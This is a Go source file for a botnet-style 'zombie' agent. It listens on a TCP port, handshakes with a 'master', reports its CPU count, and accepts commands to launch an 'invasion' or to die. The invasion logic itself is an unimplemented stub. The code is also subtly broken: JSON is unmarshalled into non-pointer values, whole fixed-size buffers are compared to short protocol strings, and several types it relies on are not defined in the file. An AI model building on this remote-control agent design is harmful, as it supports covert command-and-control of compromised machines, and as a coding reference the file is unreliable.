package main

import (
	"fmt"
	"os"
	"net"
	"strconv"
	"runtime"
	"encoding/json"
	"time"
)
func okaerinasai (conn net.Conn, cfg config) {
	timeout := time.Millisecond * 5000
	msg := make ([]byte, 2048)
	conn.SetReadDeadline(time.Now().Add(timeout) )
	_, err := conn.Read(msg)
	if err != nil { conn.Write([]byte(err.Error())); return }

	if string(msg) == syn {
		for i:=0; i<len(msg); i++ {	msg[i]=0x00; }
		conn.Write([]byte(ack))

		conn.SetReadDeadline(time.Now().Add(timeout) )
		_, err = conn.Read(msg)
		if err != nil { conn.Write([]byte(err.Error())); return }

		var master Master
		err = json.Unmarshal(msg, master)
		//master.Port (the irrelevant at this point, really), master.Uri (Also irrelevant at this point)
		if err != nil { conn.Write([]byte(err.Error())); return }
		for i:=0; i<len(msg); i++ {	msg[i]=0x00; }
		conn.Write([]byte(ack))

		conn.SetReadDeadline(time.Now().Add(timeout) )
		_, err = conn.Read(msg)
		if err != nil { conn.Write([]byte(err.Error())); return }

		zombie := Zombie{}
		zombie.Conn = conn
		err = json.Unmarshal(msg, zombie.Info)
		//zombie.Uri (can check if it's equal to hostname or nslookup), zombie.Ncpu (#threads)
		if err != nil { conn.Write([]byte(err.Error())); return }
		for i:=0; i<len(msg); i++ {	msg[i]=0x00; }
		conn.Write([]byte(ack))

		func () {
			runtime.GOMAXPROCS(zombie.Info.Ncpu)
		}()

		//Reset the read deadline
		conn.SetReadDeadline(time.Time{})

		/* At this point, checkZombies is done. Start a message handler. */
		zombieHeart(zombie, cfg)
		
	}else {	conn.Write([]byte("Who are you?")); return }
}
func zombieHeart(zombie Zombie, cfg config){
	msg := make ([]byte, 1024)
	for {
		zombie.Conn.Read(msg)
		switch (string(msg)) {
		case "!":
			invStart := make(chan int)
			zombie.Limbs = append(zombie.Limbs, invStart)
			go hajime(zombie, invStart, cfg)
		case pingMsg:
		case dieMsg:
			for _,limb := range zombie.Limbs{
				limb <- 0
			}
			zombie.Conn.Write([]byte(deadMsg))
			os.Exit(1)
		}
		for i:=0; i<len(msg); i++ {	msg[i]=0x00; }		
	}
}

func hajime(zombie Zombie, handler chan int, cfg config){
	msg := make ([]byte, 4096)
	zombie.Conn.Write([]byte(ack))

	_, err := zombie.Conn.Read(msg)
	if err != nil { zombie.Conn.Write([]byte(err.Error())) }
	err = json.Unmarshal(msg, cfg.CommandList)
	if err != nil { zombie.Conn.Write([]byte(err.Error())) }
	for i:=0; i<len(msg); i++ {	msg[i]=0x00; }
	zombie.Conn.Write([]byte(ack))

	//Parse the command list and start the invasion!

	select {
	case finger := <- handler:
		switch finger {
		case 0:
			close (handler)
			return
		}

	}
}

func zombieStart(cfg config) {
 	ln, err := net.Listen("tcp", ":"+strconv.Itoa(cfg.Port))
 	if err != nil { fmt.Println (err.Error()); os.Exit(1) }
 	print("Listening for a master on: "); print(ln.Addr()); print("\n");
 	for {
 		conn, err := ln.Accept()
 		if err != nil { fmt.Println (err.Error()) }
 		//Only one master per zombie.
 		okaerinasai(conn, cfg)
 	}
}
